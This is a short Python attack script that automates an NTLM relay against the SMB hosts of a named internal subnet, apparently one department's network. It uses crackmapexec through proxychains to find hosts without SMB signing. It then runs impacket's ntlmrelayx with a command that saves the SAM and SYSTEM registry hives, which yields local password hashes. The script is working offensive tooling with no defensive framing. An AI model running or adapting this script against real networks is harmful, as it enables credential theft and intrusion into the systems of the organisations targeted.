#!/usr/bin/env python3
# Description: Wrapper script to automate NTLM relay attacks targeting the ACCOUNT department.
# Requires: impacket (ntlmrelayx.py)

import os
import sys

TARGET_SUBNET = "10.10.20.0/24"
TARGET_FILE = "targets.txt"

def setup_targets():
    print(f"[*] Extracting SMB hosts with no SMB signing in {TARGET_SUBNET}...")
    # Using crackmapexec to find vulnerable targets and save to file
    os.system(f"proxychains crackmapexec smb {TARGET_SUBNET} --gen-relay-list {TARGET_FILE}")

def run_relay():
    if not os.path.exists(TARGET_FILE):
        print("[-] Target file not found!")
        sys.exit(1)
        
    print("[*] Starting ntlmrelayx.py to dump SAM hashes...")
    # Execute ntlmrelayx and dump local SAM database upon successful relay
    os.system(f"proxychains ntlmrelayx.py -tf {TARGET_FILE} -smb2support -c 'reg save HKLM\\SAM C:\\sam.save && reg save HKLM\\SYSTEM C:\\system.save'")

if __name__ == "__main__":
    print("[*] Enterprise NTLM Relay Automation initiated...")
    setup_targets()
    run_relay()
